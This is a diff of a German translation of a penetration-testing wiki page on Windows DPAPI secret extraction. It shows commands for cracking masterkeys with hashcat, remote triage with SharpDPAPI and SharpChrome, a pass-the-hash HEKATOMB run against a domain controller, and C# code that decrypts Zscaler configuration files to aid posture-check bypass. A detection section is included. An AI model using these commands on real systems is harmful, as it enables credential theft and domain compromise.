 `DPAPISnoop` (2024) automatisiert den Prozess:
 ```bash
@@ -334,12 +334,12 @@ Microsoft führte ab Windows 10 v1607 (2016) ein **context 3**-Masterkey-Format 
 DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
 hashcat -m 22102 bob.hc wordlist.txt -O -w4
 ```
-Das Tool kann auch Credential- und Vault-Blobs parsen, sie mit geknackten Schlüsseln entschlüsseln und Klartext-Passwörter exportieren.<sup>[[8]](#references)</sup>
+Das Tool kann auch Credential- und Vault-Blobs analysieren, sie mit geknackten Schlüsseln entschlüsseln und Klartext-Passwörter exportieren.<sup>[[8]](#references)</sup>
 
 
-### Zugriff auf Daten anderer Computer
+### Zugriff auf Daten anderer Rechner
 
-In **SharpDPAPI und SharpChrome** können Sie die Option **`/server:HOST`** angeben, um auf die Daten eines Remote-Computers zuzugreifen. Natürlich müssen Sie auf diesen Computer zugreifen können. Im folgenden Beispiel wird vorausgesetzt, dass der **Domänen-Backup-Verschlüsselungsschlüssel bekannt ist**:
+In **SharpDPAPI und SharpChrome** können Sie die Option **`/server:HOST`** angeben, um auf die Daten eines Remote-Rechners zuzugreifen. Natürlich müssen Sie auf diesen Rechner zugreifen können. Im folgenden Beispiel wird vorausgesetzt, dass der **Backup-Verschlüsselungsschlüssel der Domäne bekannt ist**:
 ```bash
 SharpDPAPI.exe triage /server:HOST /pvk:BASE64
 SharpChrome cookies /server:HOST /pvk:BASE64
@@ -348,30 +348,30 @@ SharpChrome cookies /server:HOST /pvk:BASE64
 
 ### HEKATOMB
 
-[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis sowie die Extraktion des Backup-Schlüssels des Domain Controllers über RPC automatisiert. Das Script löst anschließend die IP-Adresse aller Computer auf und führt auf allen Computern einen smbclient aus, um alle DPAPI blobs aller Benutzer abzurufen und alles mit dem Domain backup key zu entschlüsseln.
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis sowie die Extraktion des Backup-Schlüssels des Domain Controllers über RPC automatisiert. Das Script ermittelt anschließend die IP-Adresse aller Computer und führt auf allen Computern einen smbclient aus, um alle DPAPI blobs aller Benutzer abzurufen und alles mit dem Domain-Backup-Schlüssel zu entschlüsseln.
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-Mit der aus LDAP extrahierten Computerliste kann man jedes Subnetz finden, selbst wenn man es vorher nicht kannte!
+Mit der aus LDAP extrahierten Computerliste kannst du jedes Subnetz finden, selbst wenn du es vorher nicht kanntest!
 
 ### DonPAPI 2.x (2024-05)
 
-[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann durch DPAPI geschützte Secrets automatisch dumpen. Das 2.x-Release führte Folgendes ein:<sup>[[9]](#references)</sup>
+[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann automatisch durch DPAPI geschützte Secrets dumpen. Das 2.x-Release führte Folgendes ein:<sup>[[9]](#references)</sup>
 
-* Paralleles Sammeln von blobs von Hunderten Hosts
-* Parsing von **context 3** masterkeys und automatische Hashcat cracking-Integration
-* Unterstützung für verschlüsselte Chrome-"App-Bound"-Cookies (siehe nächsten Abschnitt)
-* Einen neuen **`--snapshot`**-Modus, um Endpoints wiederholt abzufragen und neu erstellte blobs zu vergleichen
+* Parallele Sammlung von blobs von Hunderten Hosts
+* Parsing von **context 3** masterkeys und automatische Integration des Hashcat cracking
+* Unterstützung für verschlüsselte Chrome-„App-Bound“-Cookies (siehe nächsten Abschnitt)
+* Einen neuen **`--snapshot`**-Modus, der Endpoints wiederholt abfragt und neu erstellte blobs ermittelt
 
 ### DPAPISnoop
 
-[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ist ein C#-Parser für masterkey/credential/vault-Dateien, der Hashcat/JtR-Formate ausgeben und optional automatisch cracking ausführen kann. Das Tool unterstützt machine- und user-masterkey-Formate bis einschließlich Windows 11 24H1 vollständig.<sup>[[8]](#references)</sup>
+[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ist ein C#-Parser für masterkey/credential/vault-Dateien, der Hashcat/JtR-Formate ausgeben und optional automatisch cracking ausführen kann. Er unterstützt vollständig die machine- und user-masterkey-Formate bis einschließlich Windows 11 24H1.<sup>[[8]](#references)</sup>
 
 
-## Häufige Detections
+## Gängige Erkennungen
 
 - Zugriff auf Dateien in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` und anderen DPAPI-bezogenen Verzeichnissen.
-- Besonders über einen Network Share wie **C$** oder **ADMIN$**.
+- Insbesondere über einen Network Share wie **C$** oder **ADMIN$**.
 - Verwendung von **Mimikatz**, **SharpDPAPI** oder ähnlichen Tools, um auf den LSASS-Speicher zuzugreifen oder masterkeys zu dumpen.
 - Event **4662**: *An operation was performed on an object* – kann mit dem Zugriff auf das **`BCKUPKEY`**-Objekt korreliert werden.
 - Event **4673/4674**, wenn ein Prozess *SeTrustedCredManAccessPrivilege* (Credential Manager) anfordert
@@ -379,13 +379,13 @@ Mit der aus LDAP extrahierten Computerliste kann man jedes Subnetz finden, selbs
 ---
 ### Sicherheitslücken und Änderungen im Ökosystem 2023–2025
 
-* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ein Angreifer mit Netzwerkzugriff konnte ein Domain-Mitglied dazu bringen, einen schädlichen DPAPI backup key abzurufen, wodurch die Entschlüsselung von user masterkeys ermöglicht wurde. Die Sicherheitslücke wurde im kumulativen Update vom November 2023 behoben – Administratoren sollten sicherstellen, dass DCs und Workstations vollständig gepatcht sind.<sup>[[4]](#references)</sup>
-* **Chrome 127 „App-Bound“-Cookie-Verschlüsselung** (Juli 2024) ersetzte den bisherigen reinen DPAPI-Schutz durch einen zusätzlichen Schlüssel, der im **Credential Manager** des Benutzers gespeichert wird. Die Offline-Entschlüsselung von Cookies erfordert nun sowohl den DPAPI masterkey als auch den **GCM-wrapped app-bound key**. SharpChrome v2.3 und DonPAPI 2.x können den zusätzlichen Schlüssel wiederherstellen, wenn sie im user context ausgeführt werden.<sup>[[5]](#references)</sup>
+* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ein Angreifer mit Network Access konnte ein Domain-Mitglied dazu bringen, einen bösartigen DPAPI-Backup-Schlüssel abzurufen, wodurch die Entschlüsselung von Benutzer-masterkeys ermöglicht wurde. Im kumulativen Update vom November 2023 gepatcht – Administratoren sollten sicherstellen, dass DCs und Workstations vollständig gepatcht sind.<sup>[[4]](#references)</sup>
+* **Chrome 127 „App-Bound“-Cookie-Verschlüsselung** (Juli 2024) ersetzte den bisherigen reinen DPAPI-Schutz durch einen zusätzlichen Schlüssel, der im **Credential Manager** des Benutzers gespeichert wird. Die Offline-Entschlüsselung von Cookies erfordert nun sowohl den DPAPI-masterkey als auch den **GCM-wrapped app-bound key**. SharpChrome v2.3 und DonPAPI 2.x können den zusätzlichen Schlüssel wiederherstellen, wenn sie im user context ausgeführt werden.<sup>[[5]](#references)</sup>
 
 
-### Fallstudie: Zscaler Client Connector – Benutzerdefinierte Entropy aus SID abgeleitet
+### Fallstudie: Zscaler Client Connector – Custom Entropy abgeleitet aus der SID
 
-Zscaler Client Connector speichert mehrere Konfigurationsdateien unter `C:\ProgramData\Zscaler` (z. B. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Jede Datei wird mit **DPAPI (Machine scope)** verschlüsselt, aber der Anbieter verwendet eine **custom entropy**, die *zur Laufzeit berechnet* wird, anstatt auf dem Datenträger gespeichert zu werden.<sup>[[1]](#references)</sup>
+Zscaler Client Connector speichert mehrere Konfigurationsdateien unter `C:\ProgramData\Zscaler` (z. B. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Jede Datei wird mit **DPAPI (Machine scope)** verschlüsselt, aber der Anbieter verwendet **Custom Entropy**, die *zur Laufzeit berechnet* und nicht auf dem Datenträger gespeichert wird.<sup>[[1]](#references)</sup>
 
 Die Entropy wird aus zwei Elementen rekonstruiert:
 
@@ -407,15 +407,15 @@ byte[] entropy = new byte[tmp.Length / 2];
 for (int i = 0; i < entropy.Length; i++)
 entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
 ```
-Da das Geheimnis in einer DLL eingebettet ist, die von der Festplatte gelesen werden kann, kann **jeder lokale Angreifer mit SYSTEM-Rechten die Entropie für jede SID erneut generieren und die Blobs offline entschlüsseln**:
+Da das Geheimnis in einer DLL eingebettet ist, die von der Festplatte gelesen werden kann, kann **jeder lokale Angreifer mit SYSTEM-Rechten die Entropie für jede SID neu generieren** und die Blobs offline entschlüsseln:
 ```csharp
 byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
 byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
 Console.WriteLine(Encoding.UTF8.GetString(clear));
 ```
-Die Entschlüsselung liefert die vollständige JSON-Konfiguration, einschließlich jedes **device posture check** und seines erwarteten Werts – Informationen, die bei Versuchen zu clientseitigen Bypasses sehr wertvoll sind.
+Die Entschlüsselung liefert die vollständige JSON-Konfiguration, einschließlich jedes **device posture check** und seines erwarteten Werts – Informationen, die bei Versuchen für client-seitige Bypasses sehr wertvoll sind.
 
-> TIPP: Die anderen verschlüsselten Artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sind mit DPAPI **ohne entropy** (`16` Nullbytes) geschützt. Sie können daher direkt mit `ProtectedData.Unprotect` entschlüsselt werden, sobald SYSTEM-Berechtigungen erlangt wurden.
+> TIP: Die anderen verschlüsselten Artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sind mit DPAPI **ohne** Entropie (`16` Nullbytes) geschützt. Sie können daher direkt mit `ProtectedData.Unprotect` entschlüsselt werden, sobald SYSTEM-Rechte erlangt wurden.
 
 ## Referenzen
 
